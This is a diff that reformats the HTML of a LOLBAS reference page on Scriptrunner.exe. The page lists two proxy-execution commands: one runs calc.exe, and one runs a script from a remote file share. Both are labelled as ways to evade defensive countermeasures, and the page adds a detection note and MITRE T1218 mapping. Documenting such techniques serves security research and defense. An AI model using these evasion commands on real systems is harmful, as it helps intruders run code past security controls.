@@ -28,13 +28,17 @@
     </div>
 </h1>
 
-
 <ul class="function-list">
-    
-    
-    <li><a href="/lolbas/Binaries/Scriptrunner/#execute">Execute</a></li>
-    
+	
+	
+	
+	<li><a href="/lolbas/Binaries/Scriptrunner/#execute">Execute</a></li>
+	
 </ul>
+
+	
+
+
 
 
 
@@ -50,78 +54,71 @@
 </p>
 <br>
 <b>Resources:</b> 	
-	<ul style="list-style-type:none">
+<br>
 	
-	<li><a href="https://twitter.com/KyleHanslovan/status/914800377580503040">https://twitter.com/KyleHanslovan/status/914800377580503040</a></li>
+	<a href="https://twitter.com/KyleHanslovan/status/914800377580503040">https://twitter.com/KyleHanslovan/status/914800377580503040</a>
+	<br>
 	
-	<li><a href="https://twitter.com/NickTyrer/status/914234924655312896">https://twitter.com/NickTyrer/status/914234924655312896</a></li>
+	<a href="https://twitter.com/NickTyrer/status/914234924655312896">https://twitter.com/NickTyrer/status/914234924655312896</a>
+	<br>
 	
-	<li><a href="https://github.com/MoooKitty/Code-Execution">https://github.com/MoooKitty/Code-Execution</a></li>
+	<a href="https://github.com/MoooKitty/Code-Execution">https://github.com/MoooKitty/Code-Execution</a>
+	<br>
 	 
-	</ul>
 <br>
 <p><b>Acknowledgement:</b> 
-	<ul style="list-style-type:none">
+<br>
 	
-	<li>Nick Tyrer - <a href="https://twitter.com/@nicktyrer">@nicktyrer</a </li>
+	Nick Tyrer - <a href="https://twitter.com/@nicktyrer">@nicktyrer</a>
+	<br>
 	 
-	</ul>
 </p>
 <br>
-<p><b>Detection:</b> 
-	<ul style="list-style-type:none">
+<p><b>Detection:</b>
+<br>
 	
-	<li>Scriptrunner.exe should not be in use unless App-v is deployed</li>
+	Scriptrunner.exe should not be in use unless App-v is deployed
+	<br>
 	 
-	</ul>
 </p>
 <br>
 <br>
 
 
 
-
-
-
-<h2 id="execute" class="function-name">Execute</h2>
-
-<p>The LOLBAS can achieve abritrary code execution.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Executes calc.exe</p>
-
+	
+<h2 id="execute" class ="function-name">Execute</h2>
+	
+		Executes calc.exe
+		<br>
+		<pre><code>Scriptrunner.exe -appvscript calc.exe</code></pre>
 		Usecase:Execute binary through proxy binary to evade defensive counter measurments
-        <pre><code>Scriptrunner.exe -appvscript calc.exe</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a></li>
-	<br><br>	
-    
-
-
-
-    <li>
-        <p>Executes calc.cmde from remote server</p>
-
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Executes calc.cmde from remote server
+		<br>
+		<pre><code>ScriptRunner.exe -appvscript "\\fileserver\calc.cmd"</code></pre>
 		Usecase:Execute binary through proxy binary  from external server to evade defensive counter measurments
-        <pre><code>ScriptRunner.exe -appvscript "\\fileserver\calc.cmd"</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a></li>
-	<br><br>	
-    
-
-</ul>
-<br><br>
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1218">T1218</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
         <script>
          // add permalink on headings
